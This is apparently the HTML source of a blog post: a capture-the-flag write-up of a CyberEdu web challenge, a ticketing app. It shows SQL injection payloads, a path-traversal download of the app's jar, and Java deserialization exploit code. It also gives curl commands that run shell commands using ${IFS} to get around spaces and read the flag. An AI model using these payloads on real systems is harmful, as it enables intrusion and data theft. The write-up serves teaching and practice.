@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu jargon Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, web">
+<meta name="description" content="Challenge overview
+This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
+
+Identifying the vulnerabilities
+We can look at /tickets?user=admin by clicking tickets. Here we&rsquo;re given some hints:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu jargon Writeup">
+  <meta property="og:description" content="Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
+Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-09T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu jargon Writeup">
+<meta name="twitter:description" content="Challenge overview
+This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
+
+Identifying the vulnerabilities
+We can look at /tickets?user=admin by clicking tickets. Here we&rsquo;re given some hints:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu jargon Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu jargon Writeup",
+  "name": "CyberEdu jargon Writeup",
+  "description": "Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?\nIdentifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we\u0026rsquo;re given some hints:\n",
+  "keywords": [
+    "CyberEdu", "web"
+  ],
+  "articleBody": "Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?\nIdentifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:\nAfter attempting a simple user=' OR 1=1-- SQL injection, it is successful. We end up finding three columns (/tickets?user=' UNION SELECT 1,2,3-- works).\nThese are our columns. But no flag. I tried with SQLmap as well:\nTable: tickets [56 entries] +----+-------+------------------------------------------------------------------------+ | id | name | message | +----+-------+------------------------------------------------------------------------+ | 1 | admin | Hello from seeded admin ticket #1 | | 2 | admin | Hello from seeded admin ticket #2 | | 3 | admin | Hello from seeded admin ticket #3 | | 4 | admin | Hello from seeded admin ticket #4 | | 5 | admin | Hello from seeded admin ticket #5 | | 6 | admin | Hello from seeded admin ticket #6 | | 7 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 8 | admin | Hello from seeded admin ticket #8 | | 9 | admin | Hello from seeded admin ticket #9 | | 10 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) | | 11 | admin | Hello from seeded admin ticket #11 | | 12 | admin | Hello from seeded admin ticket #12 | | 13 | admin | Reminder: db creds are admin:password123 (change before prod!) | | 14 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 15 | admin | Hello from seeded admin ticket #15 | | 16 | admin | Hello from seeded admin ticket #16 | | 17 | admin | API_KEY=sk_test_51JargonSuperLeaky17 | | 18 | admin | Hello from seeded admin ticket #18 | | 19 | admin | Hello from seeded admin ticket #19 | | 20 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) | | 21 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 22 | admin | Hello from seeded admin ticket #22 | | 23 | admin | Hello from seeded admin ticket #23 | | 24 | admin | Hello from seeded admin ticket #24 | | 25 | admin | Hello from seeded admin ticket #25 | | 26 | admin | Reminder: db creds are admin:password123 (change before prod!) | | 27 | admin | Hello from seeded admin ticket #27 | | 28 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 29 | admin | Hello from seeded admin ticket #29 | | 30 | admin | Internal note: Compiled jar is stored in /app/target/jargon.jar | | 31 | admin | Hello from seeded admin ticket #31 | | 32 | admin | Hello from seeded admin ticket #32 | | 33 | admin | Hello from seeded admin ticket #33 | | 34 | admin | API_KEY=sk_test_51JargonSuperLeaky34 | | 35 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 36 | admin | Hello from seeded admin ticket #36 | | 37 | admin | Hello from seeded admin ticket #37 | | 38 | admin | Hello from seeded admin ticket #38 | | 39 | admin | Reminder: db creds are admin:password123 (change before prod!) | | 40 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) | | 41 | admin | Hello from seeded admin ticket #41 | | 42 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 43 | admin | Hello from seeded admin ticket #43 | | 44 | admin | Hello from seeded admin ticket #44 | | 45 | admin | Hello from seeded admin ticket #45 | | 46 | admin | Hello from seeded admin ticket #46 | | 47 | admin | Hello from seeded admin ticket #47 | | 48 | admin | Hello from seeded admin ticket #48 | | 49 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor'); | | 50 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) | | 51 | NULL | NULL | +----+-------+------------------------------------------------------------------------+ We can try something else though. Through http://34.159.240.221:32266/download?id=../../app/target/jargon.jar we can download the .jar file. I ran strings on it and found this:\nI unzipped the file and moved to my main ubuntu machine, because kali really doesn’t want me to install java on it. We can view the Classes, App and Exploit using javap, but I didn’t like how they looked.\nSo I installed jd-gui to view the classes better because javap was just very confusing for me and I like GUIs more, so sue me.\nThe vulnerabilities we’re talking about are in Java Object Deserialization, which I wrote a short material about here, in case you haven’t heard about this concept before.\nThis deserialization was the most relevant and vulnerable part in App.class:\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException { String ctype = req.getContentType(); resp.setContentType(\"text/html\"); if (ctype != null \u0026\u0026 ctype.startsWith(\"application/octet-stream\")) { try (ObjectInputStream ois = new ObjectInputStream((InputStream)req.getInputStream())) { Object obj = ois.readObject(); resp.getWriter().println(header(\"Exploit\") + \" [!] Deserialization Result\" + obj.toString() + \"\n\" + footer()); } catch (Exception e) { resp.getWriter().println(header(\"Error\") + \"Error: \" + e .getMessage() + \"\n\" + footer()); } } And here was Exploit.Class:\npackage ctf.jargon; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Exploit implements Serializable { private static final long serialVersionUID = 1L; private String cmd; public Exploit(String cmd) { this.cmd = cmd; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); Runtime.getRuntime().exec(this.cmd); } public String toString() { return \"Exploit triggered with command: \" + this.cmd; } } Exploit basically runs a command, command that is passed as a String argument. It doesn’t print the results out anywhere, though; First I tried with \"cat /flag.txt \u003e /app/uploads/flag.txt\" but it didn’t write the file; It did get parsed properly though.\nThe way the Runtime.exec() expects is a String ARRAY, not just a single string, like we have; It splits it into tokens based on the spaces. Something like this : exec(new String[]{\"/bin/sh\", \"-c\", \"touch /tmp/empty.txt\"}); would work.\nThat way, we just ran shell with the command touch. And that was it. It ignored the rest.\nWe would need a String[], we have String. How do we do this? ChatGPT said it’s impossible.\nIt took me SO SO LONG to figure this out and I felt so stupid. I tried sending the most complex niche payloads possible, and then I thought, what if I just remove the spaces? Because that’s how Runtime.exec() tokenizes? Guess what.\nAnyways, here’s the script to generate and serialize the Object and run commands.\ncat \u003e SerializeExploit.java \u003c\u003c 'EOF' import ctf.jargon.Exploit; import java.io.*; public class SerializeExploit { public static void main(String[] args) throws Exception { // Write flag to uploads directory (where files are saved) Exploit exp = new Exploit(\"/bin/sh -c ls\u003e/tmp/ls.txt \"); FileOutputStream fos = new FileOutputStream(\"exploit.ser\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(exp); oos.close(); System.out.println(\"Serialized exploit to exploit.ser\"); } } EOF javac -cp .:*.jar SerializeExploit.java java -cp .:*.jar SerializeExploit curl -X POST http://34.89.163.72:32050/contact \\ -H \"Content-Type: application/octet-stream\" \\ --data-binary @exploit.ser curl http://34.89.163.72:32050/download?id=/tmp/ls.txt We still can’t enter spaces though, but then Claude helped and said we can replace them with ${IFS}, some internal variable. IFS means Internal Field Separator, and it determines how the shell splits words, and it contains a space, tab, newline. So we get our space.\nls${IFS}/\u003e/tmp/ls.txt showed a file named flag-butlocationhastobesecret-1942e3.txt, which then I showed with cat${IFS}/flag-butlocationhastobesecret-1942e3.txt\u003e/tmp/ls.txt:\n",
+  "wordCount" : "1295",
+  "inLanguage": "en",
+  "datePublished": "2026-01-09T00:00:00Z",
+  "dateModified": "2026-01-09T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu jargon Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit <strong><a href="https://app.cyber-edu.co/challenges/9fc6276f-ba87-4bc0-8277-b9640c3ce3de?tenant=cyberedu">these outdated systems</a></strong> today, or has old-school web exploitation become harder in the modern landscape?</p>
+<hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>We can look at <code>/tickets?user=admin</code> by clicking tickets. Here we&rsquo;re given some hints:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/ticket.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/ticket2.png#center"></p>
+<p>After attempting a simple <code>user=' OR 1=1--</code> SQL injection, it is successful. We end up finding three columns (<code>/tickets?user=' UNION SELECT 1,2,3--</code> works).</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/tickets3.png#center"></p>
+<p>These are our columns. But no flag. I tried with SQLmap as well:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Table: tickets
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">56</span> entries]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+-------+------------------------------------------------------------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> name  <span style="color:#f92672">|</span> message                                                                <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+-------+------------------------------------------------------------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#1                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#2                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#3                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">4</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#4                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#5                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">6</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#6                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#8                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span>  <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#9                                      |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> DEBUG LOG: NullPointerException at ctf<span style="color:#f92672">.</span>jargon<span style="color:#f92672">.</span>App<span style="color:#f92672">.</span>doPost(App<span style="color:#f92672">.</span>java:<span style="color:#ae81ff">132</span>) <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">11</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#11                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#12                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">13</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Reminder: db creds are admin:password123 (change before prod<span style="color:#960050;background-color:#1e0010">!</span>)         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">14</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">15</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#15                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#16                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">17</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> API_KEY<span style="color:#f92672">=</span>sk_test_51JargonSuperLeaky17                                   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">18</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#18                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">19</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#19                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> DEBUG LOG: NullPointerException at ctf<span style="color:#f92672">.</span>jargon<span style="color:#f92672">.</span>App<span style="color:#f92672">.</span>doPost(App<span style="color:#f92672">.</span>java:<span style="color:#ae81ff">132</span>) <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">21</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">22</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#22                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">23</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#23                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#24                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">25</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#25                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Reminder: db creds are admin:password123 (change before prod<span style="color:#960050;background-color:#1e0010">!</span>)         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">27</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#27                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">28</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">29</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#29                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Internal note: Compiled jar <span style="color:#f92672">is</span> stored <span style="color:#f92672">in</span> <span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>jargon<span style="color:#f92672">.</span>jar        <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#31                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#32                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">33</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#33                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">34</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> API_KEY<span style="color:#f92672">=</span>sk_test_51JargonSuperLeaky34                                   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">35</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#36                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">37</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#37                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">38</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#38                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">39</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Reminder: db creds are admin:password123 (change before prod<span style="color:#960050;background-color:#1e0010">!</span>)         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> DEBUG LOG: NullPointerException at ctf<span style="color:#f92672">.</span>jargon<span style="color:#f92672">.</span>App<span style="color:#f92672">.</span>doPost(App<span style="color:#f92672">.</span>java:<span style="color:#ae81ff">132</span>) <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">41</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#41                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">42</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
